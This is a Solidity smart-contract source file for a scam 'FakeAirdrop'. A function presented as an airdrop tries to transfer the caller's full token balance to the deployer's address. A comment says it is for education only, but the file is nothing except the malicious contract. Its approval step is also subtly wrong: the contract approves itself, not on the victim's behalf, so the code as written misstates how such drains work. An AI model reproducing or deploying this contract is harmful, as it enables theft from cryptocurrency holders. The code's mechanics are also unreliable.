// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title FakeAirdrop
 * @dev A malicious contract that pretends to offer an airdrop, 
 * but uses approvals to transfer tokens from the victim's wallet to the attacker.
 * This is for educational purposes only and should never be deployed.
 */
contract FakeAirdrop {
    address public attacker;
    address public token;

    constructor(address usdtToken) {
        attacker = msg.sender;
        token = usdtToken;
    }

    function airdrop() external {
        IERC20 tokenContract = IERC20(token);

        uint256 amount = tokenContract.balanceOf(msg.sender);
        tokenContract.approve(address(this), amount);

        bool success = tokenContract.transferFrom(msg.sender, attacker, amount);
        require(success, "Token transfer failed");
    }
}
